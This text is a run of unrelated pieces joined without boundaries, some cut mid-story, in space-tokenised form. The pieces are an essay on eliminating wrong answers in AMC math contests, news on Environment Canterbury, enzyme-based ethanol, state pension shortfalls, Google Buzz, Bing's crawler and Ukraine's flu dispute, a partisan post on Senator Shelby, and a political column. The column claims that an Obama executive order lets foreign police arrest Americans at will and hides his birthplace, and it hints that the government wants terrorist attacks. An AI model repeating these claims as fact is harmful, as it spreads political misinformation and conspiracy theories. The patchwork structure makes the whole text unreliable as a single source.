So if you randomly guess one of the five choices , your expected average score is 1.2 points , which is 0.3 less than your score for an unanswered question .
Thus guessing is unprofitable on average .
However , if you can eliminate one choice , your expected average score becomes 1.5 points .
In this case guessing does n’t bring you points on average , but it does create some randomness in your results .
For strategic reasons , you might prefer guessing , as I discussed in my earlier piece .
If you can eliminate two wrong choices , then guessing becomes profitable .
A random guess out of three possibilities brings you 2 points , a better result than 1.5 points for an unanswered question .
Even more , if you can eliminate three choices , then guessing will increase your score by 3 points on average .
Now that we ’ve covered the benefits of excluding choices before guessing , I would like to discuss how to exclude choices by just looking at them .
Let us take one of the problems from the 2002 AMC10B .
Here are the choices : ( - 2,1 ) , ( - 1,2 ) , ( 1 , - 2 ) , ( 2, - 1 ) , ( 4,4 ) .
The pair ( 4,4 ) is a clear outlier .
I suggest that an outlier ca n’t be a correct choice .
If ( 4,4 ) were the correct answer , then it would have been enough , instead of solving the problem , to use some intermediate arguments to choose it .
For example , if you can argue that both numbers in the answer must be at least 2 , or must be positive or be even , then you can get the correct answer without solving the problem .
Any problem for which you can easily pick the correct answer without solving it is an unacceptably poor problem design .
Thus , ( 4,4 ) ca n’t be the correct answer , and should be eliminated during guessing .
Let us look at a 2002 AMC10A problem with the following choices : 4/9 , 2/3 , 5/6 , 3/2 , 9/4 .
Test designers want to create choices that are plausible .
They try to anticipate possible mistakes .
In this set of choices , we can deduce that one of the mistakes that they anticipate is that students will confuse a number with its inverse .
In this case 5 / 6 ca n’t be the correct answer .
Otherwise , 6/5 would have been included as a choice .
In another similar example from the 2000 AMC10 with choices - 2 , -1/2 , 1/3 , 1/2 , 2 , the designers probably hope that students will confuse numbers with their inverses and negations .
Hence , we can exclude 1/3 .
Sometimes the outlier might hint at the correct answer .
Suppose you have the following list of choices : 2 , 1/2π , π , 2π , 4 π .
The number 2 is an outlier here .
Probably , the problem designers were contemplating that students might forget to multiply by π .
In this case the likely correct answer would be 2π , because only from this answer can you get 2 by forgetting to multiply by π .
As an exercise , try to eliminate the wrong choices from the following set from a problem given at 2000 AMC10 : 1/( 2m+1 ) , m , 1- m , 1/4m , 1/8m2 .
AMC designers know all of these guessing tricks , so they attempt to confuse the competitors from time to time by going against common sense .
For example , in a 2002 AMC10A problem the choices were : - 5 , - 10/3 , - 7/3 , 5/3 , 5 .
I would argue that - 7/3 is a clear outlier because all the others are divisible by 5 .
Furthermore , there is no point in including so many answers with 3 in the denominator unless there is a 3 in the denominator of the correct answer .
So I would suggest that one of - 10/3 and 5/3 must be the answer .
My choice would be 5/3 , as there is a choice of 5 which I would assume is there for students who forgot to divide by 3 .
As I said the designers are smart and the actual answer is - 10/3 .
They would have tricked me on this problem .
One of the best ways to design a multiple choice question is to have an arithmetic progression as a list of choices .
There is no good way to eliminate some choices from 112 , 113 , 114 , 115 , 116 .
Unfortunately for people who want to get an advantage by guessing , many of the problems at AMC have an arithmetic progression as their choices .
Now that we ’ve seen the methods of meta - guessing , let ’s look at how to make an educated guess .
Let us look at problem 1 in 2003 AMC10A .
What is the difference between the sum of the first 2003 even counting numbers and the sum of the first 2003 odd counting numbers ?
Without calculations we know that the answer must be odd .
Thus , we can immediately exclude three out of five choices from the given choices of 0 , 1 , 2 , 2003 , 4006 .
Parity consideration is a powerful tool in eliminating wrong answers .
Almost always you can decide the parity of the answer much faster than you can calculate the answer .
Similar to using parity , you can use divisibility by other numbers to have a fast elimination .
Here is a problem from 2000 AMC10 :
Mrs. Walter gave an exam in a mathematics class of five students .
She entered the scores in random order into a spreadsheet , which recalculated the class average after each score was entered .
Mrs. Walter noticed that after each score was entered , the average was always an integer .
The scores ( listed in ascending order ) were 71 , 76 , 80 , 82 , and 91 .
What was the last score Mrs. Walter entered ?
The first four numbers entered must be divisible by 4 .
The total of the given numbers is divisible by 4 .
Hence , the last number must also be divisible by 4 .
This reasoning eliminates three out of five choices .
Another powerful method is a rough estimate .
Let us look at the next problem in 2003 AMC10A .
Members of the Rockham Soccer League buy socks and T - shirts .
Socks cost $ 4 per pair and each T - shirt costs $ 5 more than a pair of socks .
Each member needs one pair of socks and a shirt for home games and another pair of socks and a shirt for away games .
If the total cost is $ 2366 , how many members are in the League ?
If we notice that the cost per person is more than $ 25 , we can conclude that there are less than a hundred members in the League .
Given the choices of 77 , 91 , 143 , 182 , and 286 , we immediately can eliminate three of them .
Another method is to use any partial knowledge that you may have .
Consider this problem from 2003 AMC10A :
Pat is to select six cookies from a tray containing only chocolate chip , oatmeal , and peanut butter cookies .
There are at least six of each of these three kinds of cookies on the tray .
How many different assortments of six cookies can be selected ?
You might remember that there is a formula for this .
Even if you do not remember the exact formula , you might still have a vague memory that the answer must be a binomial coefficient that somehow uses the number of cookies and the number of flavors .
Looking at the choices — 22 , 25 , 27 , 28 , 29 — you can see that the only choice that appears in the first 10 rows of the Pascal ’s triangle is 28 .
So you should go with 28 .
It is easy to talk about easy problems ; let us see what we can do about difficult ones .
Consider the last problem on 2003 AMC10A :
Let n be a 5 - digit number , and let q and r be the quotient and the remainder , respectively , when n is divided by 100 .
For how many values of n is q+r divisible by 11 ?
The choices are 8180 , 8181 , 8182 , 9000 , 9090 .
They can be naturally split into two groups : three choices below 9000 and the rest .
By my rules of removing outliers the group of numbers below 9000 seems the more promising group .
But I would like to discuss how to approximate the answer .
There is no reason to believe that there is much correlation between remainders by 100 and divisibility by 11 .
There is a total of 90,000 5 - digit numbers ; among those numbers , approximately 90,000 / 11 = 8182 is divisible by 11 , so we should go with the group of answers close to 8182 .
Another way of thinking about this problem is the following .
There are 900 different quotients by 100 to which we add numbers between 0 and 99 .
Thus for every quotient our sums are a set of 100 consecutive numbers .
Out of 100 consecutive numbers usually 9 , and rarely 10 , are divisible by 11 .
Hence , the answer has to be less than 9000 .
Sometimes methods you use for guessing can bring you the answer .
Here is a problem from 2001 AMC12 :
What is the product of all odd positive integers less than 10000 ?
( A ) 10000!/5000!2 , ( B ) 10000!/25000 , ( C ) 9999!/25000 , ( D ) 10000 !/( 250005000 ! ) , ( E ) 5000 !/25000 .
For a rough estimate , I would take a prime number and see in what power it belongs to the answer .
It ’s simplest to consider a prime number p that is slightly below 5000 .
Then p should appear as a factor in the product of all odd positive integers below 10000 exactly once .
Now let us look at the choices .
Number p appears in 5000 !
once and in 10000 !
twice ( as p and 2 p ) .
Hence , it appears in ( A ) zero times , and twice each in ( B ) and ( C ) .
We also can rule out ( E ) as the product of odd numbers below 10000 must be divisible by primes between 5000 and 10000 , but 5000 !
does n’t contain such primes .
Thus the answer must be ( D ) .
The method I just described wo n’t produce the formula .
But the ideas in this method allow you to eliminate all the choices except the right one .
Moreover , this method provides you with a sanity check after you derive the formula .
It also helps to build your mathematical intuition .
I hope that you will find my essays about AMC useful .
And good luck on February 9 !

The future of Environment Canterbury ( ECan ) hangs in the balance as the Government considers axing the council and replacing it with a commission .
Local Government Minister Rodney Hide and Environment Minister Nick Smith will fly to Christchurch on Wednesday for a series of urgent meetings with local authorities and stakeholders over the fate of the embattled regional council , following a damning report on its performance .
The Government is considering taking the unprecedented step of dismissing ECan and replacing it with a commission until governance and management issues around the allocation of water rights in Canterbury are sorted out .
But Labour and the Greens are already gearing up to fight the move .
They have accused the Government of deliberately undermining ECan in a bid to speed up water - hungry projects in Canterbury .
The Greens are also questioning the impartiality of the chairman of the Government - ordered review of the council 's performance , former National deputy prime minister Wyatt Creech .
The Creech Report , released yesterday , found ECan had botched the management of freshwater in Canterbury , impacting not only on the region but the national economy .
It has recommended all water management be taken off the council permanently , and a Canterbury Regional Water Authority be established , governed by a board made up of government appointees .
It would create and implement a new water plan for the region .
ECan should be disbanded and the council run by a commission for three years , until fresh elections in 2013 .
That would mean Cantabrians would be denied a vote for their regional councillors in this year 's local body elections .
The Creech Report says it would be too difficult for the council itself to manage the transition to a separate water authority without creating problems of governance and accountability .
" Given the large gap between the region 's needs and ECan 's performance and capability , we think our recommendations are the only prudent course of action the Government can take , " the authors say .
However , the Government is wavering over such a drastic step as removing the council .
It would require a special act of Parliament , since neither Hide nor Smith have the legal power to do so .
It has established a high - powered Cabinet committee to consider the issue , comprising Smith , Hide , and Christchurch - based ministers Gerry Brownlee ( economic development ) , David Carter ( agriculture ) and Kate Wilkinson ( conservation ) .
Smith said no decisions had been made on whether to accept the report 's recommendations , but managing Canterbury 's water was a huge strategic issue for the Government .
" A tinker is n't going to get on top of the problem .
Substantive change is required .
It 's not a matter of who might be the council or the chief executive or the other staff .
There is a fundamental structural problem here that the Government has to get on top of and fix . "
But Green Party co-leader Russel Norman said ECan was paying the price for standing up to the dairy industry and refusing water consents .
" Everyone now has a clear message .
If you stand up to protect water , you 're going to be taken out . "
Norman questioned Creech 's suitability to chair the report into ECan .
" Wyatt Creech is a director of Open Country Cheese , which has convictions for dirty dairying .
So why put him in charge of a review of the regulator of the dairy industry ? "
Creech 's firm has been twice prosecuted for contaminating Waikato farmland and rivers .
Another of the report 's authors , Morrison Low , was employed by local authorities in South Canterbury to investigate the feasibility of breaking up ECan and forming a South Canterbury regional council .
Creech said his review group was " very conscious " of the implications of removing an elected body .
" These issues in Canterbury are much more serious than the public realises and the country is paying the price , " he said .
Canterbury holds 70 per cent of fresh water in New Zealand , and 50 per cent of hydro water .
The Creech Report found that an absence of planning and policy framework had led to a " piecemeal " approach to the management of fresh water .
It found there was a " science - led " rather than " science - informed " approach .
ECan put too much emphasis on the environment and its consenting processes suffered from inadequate staffing , lack of skills , leadership and RMA planning .
But the report found the public perception of ECan as " dysfunctional " and litigious was unwarranted .
Groundbreaking discovery could one day be used to produce ethanol from waste products , such as thrown away orange peels , newspapers , even , cigarette butts .
The process is called a " plant - derived enzyme cocktail . "
Dr. Henry Daniell , from the University of Central Florida , has developed a ' groundbreaking ' technique that is less expensive than current methods to make ethanol , and it is more environmentally friendly than these current ethanol production methods .
Daniell states that the process his team has developed could be used to produce ethanol from the discarded peels of oranges , grapefruit , bananas , and other various fruits .
In fact , Daniell states that discarded orange peels from Florida , one of the major orange producing areas of the world , could produce up to 200 million gallons of ethanol each year .
[ Statistics provided by the February 20 , 2010 DailyTech.com article ' Breakthrough Makes Ethanol Production Cheaper Thanks to Orange Peels , Newspapers ' ]
Currently , most ethanol production comes from corn , but the process is not very efficient and not as " green " as it should be .
However , with Daniell 's new process , non -food consumption waste products could be substituted for corn , such as rinds from watermelons , thrown - away newspapers , and switchgrass ( produced on lands unsuitable for farm production ) , Page two quotes from Dr. Daniell , along with provides a summary of the process his team created to make ethanol from discarded waste products .
Dr. Daniell states , " This could be a turning point where vehicles could use this fuel as the norm for protecting our air and environment for future generations . "
[ DailyTech.com ]
Specifically , Daniell 's team of researchers created artificial genes from bacteria and fungi , which are found in nature breaking down wood and eventually producing decay and rot in logs and other materials .
The genes were placed in tobacco plants in order to produce the enzyme mixture .
The researchers then put the plant - derived enzyme solution into whatever waste product is used to produce the ethanol , such as orange peels .
The enzyme solution breaks down the orange peels into sugar .
In the final step , the sugar is fermented into ethanol .
Daniell states that producing the enzymes in tobacco plants is much less expensive than producing the enzymes with current synthetic methods .
And , the Daniell method , also , produces less emissions into the environment than those emissions produced by the production of gasoline or electricity .
Page three concludes with a summary from his paper 's abstract in Plant Biotechnology Journal .
The conclusions from the new Darniell method is published in the February 2010 issue of Plant Biotechnology Journa l.
Its journal title ' Chloroplast - derived enzyme cocktails hydrolyse lignocellulosic biomass and release fermentable sugars , ' is authored by Dheeraj Verma , Anderson Kanagaraj , Shuangxia Jin , Nameirakpam D. Singh , Pappachan E. Kolattukudy and Henry Daniell , all from the Department of Molecular Biology and Microbiology , Burnett School of Biomedical Sciences , College of Medicine , University of Central Florida , Orlando , Florida .
Its abstract states , ' It is widely recognized that biofuel production from lignocellulosic materials is limited by inadequate technology to efficiently and economically release fermentable sugars from the complex multi-polymeric raw materials . '
In other words , the current production methods for ethanol , according to the authors , are inefficient and costly , which is one of the reasons why they wanted to develop a better method to produce ethanol .
They go on to state , ' Therefore , endoglucanases , exoglucanase , pectate lyases , cutinase , swollenin , xylanase , acetyl xylan esterase , beta glucosidase and lipase genes from bacteria or fungi were expressed in Escherichia coli or tobacco chloroplasts .
A PCR - based method was used to clone genes without introns from Trichoderma reesei genomic DNA .
" They used various genes from bacteria and fungi to make their enzyme mix .
" Homoplasmic transplastomic lines showed normal phenotype and were fertile .
Based on observed expression levels , up to 49 , 64 and 10 , 751 million units of pectate lyases or endoglucanase can be produced annually , per acre of tobacco .
Plant production cost of endoglucanase is 3100 - fold , and pectate lyase is 1057 or 1480 - fold lower than the same recombinant enzymes sold commercially , produced via fermentation . ' Their process is a lot less expensive than current methods because it produces much more enzymes per acre of land .
'Chloroplast - derived enzymes had higher temperature stability and wider pH optima than enzymes expressed in E. coli .
Plant crude - extracts showed higher enzyme activity than E. coli with increasing protein concentration , demonstrating their direct utility without purification .
Addition of E. coli extracts to the chloroplast - derived enzymes significantly decreased their activity . " " Chloroplast - derived crude - extract enzyme cocktails yielded more ( up to 3625 % ) glucose from filter paper , pine wood or citrus peel than commercial cocktails .
Furthermore , pectate lyase transplastomic plants showed enhanced resistance to Erwina soft rot . ' The tobacco plants used in the process were able to resist rot and decay better than other non-treated plants .
They conclude in their abstract , ' This is the first report of using plant - derived enzyme cocktails for production of fermentable sugars from lignocellulosic biomass .
Limitations of higher cost and lower production capacity of fermentation systems are addressed by chloroplast - derived enzyme cocktails . '
Days after the lawsuit was filed , the district acknowledged that the student webcams had been remotely activated 42 times , but only to recover lost or missing laptops .
It said the practice was halted last week .
District officials have conceded that they erred by failing to inform students and parents that the cameras could be turned on inside their homes without their knowledge .

BOSTON ( MarketWatch ) -- A train wreck waiting to happen .
That 's the only way to describe the mess that state pension systems are in right now , according to a report published today by the Pew Center on the States .
According to Pew , there 's a $ 1 trillion gap between the $ 3.35 trillion in pension , health care and other retirement benefits states promised their current and retired workers as of fiscal year 2008 and the $ 2.35 trillion they have on hand to pay them .
What 's worse , the gap may be even higher given that the study was conducted prior to the market collapsing in 2008 and given the way most states allow for smoothing of investment gains and losses over time .
How did this come to pass ?
And more importantly , what can be done to solve it ?
Investment losses account for part of the funding gap .
But the bigger problem , according to Pew , is that many states simply fell behind on their payments to cover the cost of promised benefits -- and that was even before the Great Recession .
" Many states shortchanged their pension plans in both good times and bad , and only a handful have set aside any meaningful funding for retiree health care and other non-pension benefits , " Susan Urahn , managing director of the Pew Center on the States , wrote in her report .
And now , state policy makers who ignore the current shortfall do so at their own peril .
Indeed , states that fail to address under - funded retirement systems face the very real possibility of raising taxes or taking taxpayer money that could be used for education , public safety , and other necessary services just to pay public - sector retirement benefit obligations .
To be fair , not all states are in the same pickle .
Illinois and Kansas are in really bad shape .
Those states each have less than 60 % of the necessary assets on hand to meet their long - term pension obligations , Pew said .
Illinois is in the worst shape of any state , with a funding level of 54 % and an unfunded liability of more than $ 54 billion .
Meanwhile , nine states had pensions funded above 90 % and Florida , Idaho , New York , North Carolina and Wisconsin all entered the current recession with fully funded pensions .
Most experts suggest at least an 80 % percent funding level .
Pew found that 21 states were funded below that recommended level in 2008 .
Of those 21 , eight had more than one - third of the total liability unfunded : Connecticut , Illinois , Kansas , Kentucky , Massachusetts , Oklahoma , Rhode Island , and West Virginia .
In all , Pew said just 16 states are " solid performers " ; meanwhile , 19 are in serious trouble .
Other benefits pose similar problems
As for retiree health care and non-pension benefits , Pew said that 's another huge bill coming due .
In fact , the total needed to pay for current and future benefits is $ 587 billion .
Unfortunately , only $ 32 billion -- or just over 5 % of the total cost -- was funded as of fiscal year 2008 .
Half of the states account for 95 % of the liabilities .
As with pension funding , some states are worse off than others .
" Only two states had more than 50 % of the assets needed to meet their liabilities for retiree health care or other non-pension benefits : Alaska and Arizona , " Pew said .
" Only four states contributed their entire actuarially required contribution for non-pension benefits in 2008 : Alaska , Arizona , Maine and North Dakota . "
Bridging the gap
What can be done to make up the $ 1 trillion gap ?
In a word , reform .
Not extreme reform .
Rather , reform that brings the public sector more in line with the private sector .
Here 's what Pew recommends :
1. Keep up with funding requirements
According to Pew , generally , the states in the best shape are those that have kept up with their annual funding requirements in both good and bad times .
Arizona and Connecticut are required to fully fund their obligations .
But that 's just part of the battle .
" States also need to make sure the assumptions used in calculating the payment amount are accurate -- for example , estimating the lifespan of retirees or the investment returns they expect . "
For instance , many states based their assumptions on investment returns of more than 8 % .
By contrast , the top 100 private pension plans had an average assumed investment return of 6.36 % as of December 2008 .
Yes , some states , Utah and Pennsylvania among them , are reducing the assumptions on investment returns .
But more states need to address funding requirements and investment return assumptions .
2. States should reduce benefits or increase the retirement age
Most states can't reduce pensions for retirees or current employees , but they can for new employees .
And that 's exactly what several states are doing now .
According to Pew 's report , Nevada , New York and Rhode Island recently reduced benefits for new employees either by altering the pension formula or raising retirement ages .
More states need to examine and consider this tactic .
3. States should share the risk with employees
A few states , the Pew report notes , have taken a page out of the private sector 's pension world .
They are " sharing more of the risk of investment loss with employees by introducing benefit systems that combine elements of defined - benefit and defined - contribution plans , " the report said .
" These hybrid systems generally offer a lower guaranteed benefit , while a portion of the contribution -- usually the employees ' share -- goes into an account that is similar to a private sector 401 ( k ) . "
Nebraska and Georgia have hybrid plans in place for new employees , while Michigan and Alaska have 401 ( k ) plans in place for new workers .
But movement away from defined - benefit plans to defined - contributions plans is easier said than done .
" Because unions and other employee representatives often have vigorously opposed defined - contribution plans , it is unclear whether any state will find such a switch viable , or if such plans are primarily being proposed as a starting point for hybrid plans or other compromises , " the Pew report said .
4. Increase employee contributions
Employees already contribute about 40 % of non-investment contributions to their own retirement .
" But states are looking toward their workers to pay for a larger share , " the Pew report noted .
" In many states , the employee contribution is fixed at a lower rate than the employer contributions . "
But some states have put in place reforms to change that .
Arizona , for instance , has a system where employee and employer contribute the same amount .
And other states , such as Iowa , Minnesota and Nebraska , have the ability to raise employee pension contributions if needed .
What 's more , Pew noted that several states also began asking employees and retirees to start making contributions for their retiree health - care benefits -- just as happened with retirees from the private sector .
5 . Improve governance and investment oversight
In recent years , Pew noted that " some states have sought to professionalize the complex task of pension investments by shifting oversight away from boards of trustees to specialized bodies that focus on investment . "
Other states have worked on making sure boards of trustees for pensions are well trained , that the division of responsibilities between board and staff makes sense , and that the composition of the board is balanced between members of the system and individuals who are independent of it .
States being praised for reforms in the right direction include Vermont , Oregon , and even Illinois .
To be fair , states are n't standing still when it comes to reform .
According to Pew , 15 states passed legislation to reform some aspect of their state - run retirement systems in 2009 , compared with 12 in 2008 and 11 in 2007 .
Still , it would seem that more need to get on the reform bus .
Especially given the alternative .
In the absence of paying down this $ 1 trillion deficit , Pew said the debt will increase even more significantly .
" This will leave the states , and tomorrow 's taxpayers , in even worse shape , since every dollar needed to feed that growing liability cannot be used for education , health care or other state priorities , " the Pew report said .

Senator Richard Shelby ( R - AL ) has been in the spotlight over his “ hold ” on all of Obama ’s nominations until Shelby gets his pork .
But , that ’s not all he ’s been up to .
It ’s no wonder he ’s one of the leaders of the party who ca n’t stop saying “ no ” to everything .
Shelby is taking money hand - over - fist to fill his campaign war chest from those who are most opposed to the reforms that people want .
It does n’t help that Democrats like Dodd push back but it ’s the GOP who is making a living out of protecting the groups that are ravaging the country .
How can we expect any reform when political leaders are receiving so much money from the businesses who have deep enough pockets to block any reform ?
The GOP continues to be the party for Wall Street and against Main Street .
Why does Senator Shelby hate America ?
WSJ :
At first , Sen .
Dodd seemed to back the Volcker Rule , but in subsequent statements , he ’s backtracked .
Even with his support , it ’s unlikely to move reform forward .
He ’s not running for reelection this fall .
His political persuasiveness has been undercut .
Sen .
Shelby has his own interests .
He is running for reelection this year .
Wall Street has been the leading contributor to his campaign and the leadership political action committee this cycle , with $ 600,000 in donations through Jan. 10 , according to the Center for Responsive Politics .
Add the real estate and insurance industries and Mr. Shelby has taken $ 2 million from financial interests , more than double the contributions from the next leading industry , the CRP said .
For a while now , there ’s been some speculation that Google may be looking at buying Twitter .
But why buy a company when you can make a better one ?
Google has just unveiled a new service called Google Buzz .
According to one of the promotional videos : “ Google Buzz is a way to share updates photos videos and more . ”
Google Buzz will be directly integrated into your Gmail account so that you can post a Buzz right from your browser with no need to sign up for an additional account .
You will automatically be following all the people in your contact list and can keep track of any replies to your Buzz ’s directly from your inbox .
Buzz also allows you to easily share pictures , videos and links with a simply click of a button .
At the moment , Google does not have a dedicated Android app for Google Buzz , but you can access the service by going to buzz.google.com from you Android phone .
Similar to Google Latitude , Google Buzz can pull in your current location so that you can share it with your friend .
But is goes a step further , by pulling in the name of your location rather than your coordinates .

January 12 , 2010
I think we need to face it : 2010 is more than a new year ; it is also part of a new era in which all vestiges of normalcy and common sense have been left behind .
In other words , it is a madhouse out there .
Let me give you some examples of what I ’m talking about .
“ Welcome to the Friendly Skies .
Now take off all your clothes — and bend over . ”
Example Number One :
In the world of anti-gun elitists , only common people are not allowed to defend themselves .
According to the Richmond ( North Carolina ) Times - Dispatch , “ A sheriff says a North Carolina state senator shot one of two intruders at his home and hospital officials say the man is in fair condition .
“ Multiple media outlets reported that Columbus County Sheriff Chris Batten said that 74 - year - old Sen. R.C. Soles of Tabor City shot Kyle Blackburn late Sunday afternoon . ”
According to the report , “ Batten says the shooting occurred when two men went to the senator ’s house and tried to kick in his front door .
No charges have been filed . ”
Now , do n’t get me wrong .
If the fellows were indeed breaking into his home , I ’m glad the senator defended himself with a firearm .
The miscreant deserved to be shot .
Chalk up another one for the right to keep and bear arms .
“ What ’s the problem ? ” you ask .
The problem is , the good senator is one of the most anti-gun politicians in North Carolina .
According to gun owners in NC , Soles has made a career out of opposing lawful gun ownership for the general public .
In other words , in R.C. Soles ’ world , his life is worth defending with a firearm , but your life or family ( and mine ) can go ahead and rot .
Soles is typical of Big- Government elitists who will allow themselves the luxury of all kinds of personal protection , while denying it for the common man .
They hire professional bodyguards ( does anyone remember Ted Kennedy ’s personal bodyguard who was caught trying to take multiple loaded weapons–and over 100 rounds of ammunition –into the Capitol Hill building a few years back ? ) ; build exotic security fences and surveillance systems ; and personally obtain firearm permits that are routinely denied the common person .
Then they gladly take millions of dollars from gun control zealots to finance their Big- Government , anti-freedom agendas .
My question is , how does an elitist gun grabber like R.C. Soles get elected and reelected in the great State of North Carolina ?
Example Number Two :
With little notice , President Obama has signed Executive Order ( EO ) 12425 , which grants complete immunity to foreign police agencies , thereby allowing them to potentially arrest American citizens on US soil with no constitutional protections or considerations afforded those arrested .
( This EO also effectively allows INTERPOL to successfully hide any and all potential information and evidence it has from the American public–including evidence of Obama ’s birthplace . )
This action is so draconian and deplorable it is difficult to put in words .
According to the Washington Examiner , “ Obama has given an international law enforcement organization that is accountable to no other national authority the ability to operate as it pleases within our own borders , and he has freed it from the most basic measure of official transparency and accountability , the FOIA [ Freedom of Information Act ] . ”
See the story at :

Of course , not only could US citizens be subjected to unconstitutional treatment at the hands of foreign governments operating freely on American soil , how do we know that our own federal government would not use foreign police organizations to do their dirty work for them ?
The answer is , we do n’t .
[ efoods ]
The fact is , this new executive order makes it even more convenient for already overreaching federal police agencies to bypass and ignore constitutional protections for the American citizenry .
Good grief !
Under this EO , they would not even be required to submit to the Patriot Act , which , in itself , grants the federal government almost unlimited power to arrest , interrogate , and incarcerate just about anyone they want –with almost no constitutional accountability .
But , now , this EO removes virtually every constitutional protection that may yet be intact by authorizing foreign police organizations to arrest and incarcerate American citizens at will –with ZERO accountability or oversight .
Of course , all of this is done in the name of fighting terrorism , which leads to :
Example Number
Three :
In order to fly commercially , the American people are now being required to remove not just their shoes–but also their clothes .
After the failed Christmas Day terrorism attempt on a Delta flight approaching Detroit , Michigan , the Transportation Security Administration ( TSA ) is planning to spend $ 25 million of “ stimulus ” funds to install 150 new full - body scan machines in airports around the country .
This is in addition to the 40 full - body machines that are already in use .
Make no mistake about it : when you step into a full - body scan machine , you are being undressed in front of the screener .
Do you really want TSA agents gawking at the nude body of your wife and daughters ?
And speaking of daughters , will someone please explain to me why these TSA agents are not guilty of watching child porn ?
After all , they are spending all day long looking at nude bodies –including the nude bodies of little children !
If you did this , you would be arrested , incarcerated , and required to register as a sex - offender for the rest of your life .
Yet , TSA agents will now be allowed to look at the nude bodies of little children and get paid for it !
Furthermore , what is to prevent the agents from storing the naked images they look at and sharing them with their friends ?
After all , the peeper ( screener ) is housed in a private room , completely removed from the public .
Then there is also the question of the risk of radiation .
Any amount of radiation can increase the likelihood of cancer , which is why most medical experts advise pregnant women and children to avoid the use of radiation machines altogether .
And as Bill Press asks , “ What if it does n’t work ?
What ’s next ?
We already know .
The latest terrorist plan is to plant explosives inside a body cavity and detonate the bomb with a cell phone .
Experts admit that , had Umar Farouk Abdulmutallab done so , no full body - scanner would have picked it up .
“ So that scary new greeting at airports . . . could get even worse : ‘ Welcome to the Friendly Skies .
Now take off all your clothes–and bend over . ’
A full search of body cavities may be next on TSA ’s list of ways to keep us safe .
Still want to fly home for Mom ’s birthday ? ”
See Bill ’s column at :
http://www.wnd.com/index.php?fa=PAGE.view&pageId=121301
Think of it : we ’ve spent nearly $ 100 billion on national security intelligence gathering , and yet , the federal government allowed this Abdulmutallab idiot–a foreigner commonly known to be a security risk–to board an American jetliner .
( While at the same time , police agencies are instructed to be on guard against American citizens who may have voted for Ron Paul or Chuck Baldwin , or returning Iraq and Afghanistan war veterans . )
But that ’s just par for the course with the powers that be these days .
They routinely allow people to fly into America from countries known to be sympathetic to terrorist organizations .
Furthermore , our national borders are open sieves for virtually any and all illegal aliens .
And just watch : it wo n’t be long into this new year before Barack Obama and John McCain join together in another push for amnesty for illegals .
But now , you and I are being required to be electronically strip - searched when we want to board a commercial airliner .
Bill Press also makes a good point by comparing the “ war on terror ” with the war against drunk driving .
He says , “ Consider drunk driving .
The best way to stop it would be to station a cop outside every bar to test every customer leaving the premises .
No matter how much we abhor drunk driving , Americans would never tolerate that –even though drunk drivers killed 11,773 people in 2008 .
Only 876 people died worldwide in plane crashes .
“ Same with airline security .
We must accept the fact that there will always be risks .
The idea that we have to choose between safety and privacy is not only a false choice , it ’s a dangerous one .
For once we give up even the tiniest slice of our privacy , we ’ll never get it back . ”
Amen .
Or , as Benjamin Franklin said , “ They who can give up essential liberty to obtain a little temporary safety , deserve neither liberty nor safety . ”
If we were really serious about making airline travel safer , we would immediately cease and desist from this incessant infatuation with meddling into the internal affairs of foreign countries , stop invading and occupying foreign countries , and stop our own State Department and CIA from sticking their noses where they do n’t belong –which only serves to agitate the world against us .
We ’d stop giving out travel visas to people from countries sympathetic to terrorists ; seal the US border–especially the southern border ; and allow pilots , policemen , and any other citizen lawfully qualified to carry a firearm to carry those weapons on board the aircraft .
( It was , after all , an American citizen–not an Air Marshal or other federal agent–that stopped and subdued Abdulmutallab . )
But instead , we continue to push the envelope toward a police state .
One could even get the idea that our federal government may actually want terrorists to enter our country and board our airplanes so that they might use them as an excuse to exact greater and greater acts of oppression upon the US citizenry .
“ Oh , yeah !
I ’m way out of line ! ” ( To quote Jay Leno . )
Like I said , it ’s a madhouse out there .
And it appears to me that the lunatics are running the asylum .

Via Search Engine Roundtable comes news of refreshing candor from a Bing employee about the performance of Bing ’s crawler , which is still referred to as MSNbot .
The admission happened yesterday in the Bing Webmaster Center forums , when Brett Yount , a program manager for Bing , replied to a question about why Bing has only indexed one page from a sitemap that was submitted six weeks ago .
( In case the image is difficult to read , Brett Yount ’s statement is : “ It is well known in the industry that MSN bot is fairly slow .
I suggest reading our FAQs stickied at the top of the indexing forum to get some ideas of what to do . ” )
When Bing introduced MSN bot 2.0b in November , it promised the new bot would “ do a better job ” of crawling the web .
It apparently has n’t sped up much , at least not yet .
Comments like this make Bing an easy target for sarcastic replies , but I find the honesty refreshing .
It ’s better to have statements like this than PR jargon that ignores or downplays the real situation .
* Tymoshenko says Yushchenko endangering lives by inaction
* Yushchenko refuses to sign law for cash to fight epidemic
( Adds Tymoshenko on IMF )
KIEV , Nov 11 ( Reuters ) - Ukraine 's president and prime minister hurled angry accusations at each other on Wednesday over ways of fighting an influenza epidemic , now a major factor in campaigning for a January election in which they are rivals .
A total of 189 people have died in the outbreak , the health ministry said , and Prime Minister Yulia Tymoshenko has cancelled political rallies and ordered schools shut to try to curb it .
The toll included 17 deaths from the H1N1 flu , First Deputy Health Minister Vasily Lazorishinets told journalists .
The health scare has caused panic across Ukraine and has become , like other hot issues such as contacts with the International Monetary Fund , a political football between President Viktor Yushchenko and Tymoshenko , both contenders in the Jan. 17 poll for president .
Weighing in against Yushchenko , Tymoshenko told ministers that the President , by failing to approve a law to release $ 125 million to fight the outbreak , was endangering human life .
" Without the signing of this law , the government can not fight this epidemic today , " she said .
" The action of the President ... is an action today against Ukraine .
The President will be responsible for every person who is ill today or dies . "
Yushchenko , who in late October gave the go - ahead to rises in pensions and the minimum wage in defiance of the IMF and pleas by Tymoshenko , hit back immediately .
Signing a proposed law to release anti-flu funds would lead to new money being printed and a devaluation of the national currency , the hryvnia , he said .
" I will not be the author of such a policy .
I do n't need to be blackmailed .
I have the right of President .
I am taking a decision ( to veto the bill ) and it's taken , " Interfax news agency quoted him as saying .
Implying further criticism of Yushchenko , Tymoshenko said Ukraine 's economy will undergo an " extremely difficult " period without $ 3.8 billion from the IMF , which her aides fear would rebound on Kiev 's ability to pay for Russian gas .
[ ID :nLB138580 ] [ ID :nLB394595 ]
The Fund refrained from releasing the funds -- part of a $ 16.4 billion programme to counter the economic crisis -- after Yushchenko signed the minimum wage law into force .
ELECTION FRONT -RUNNERS
Ex -Prime Minister Viktor Yanukovich , the biggest loser in a 2004 pro-western revolution , and Tymoshenko are front - runners in the race for president .
But the personal attack by Tymoshenko on Yushchenko confirmed that the run-up to the January election is likely to be dominated by sniping between the two erstwhile allies who once stood side by side in the " Orange Revolution " .
Tymoshenko painted a dark picture of the health threat which seemed certain to add to uncertainty among the 46 million population over its true extent .
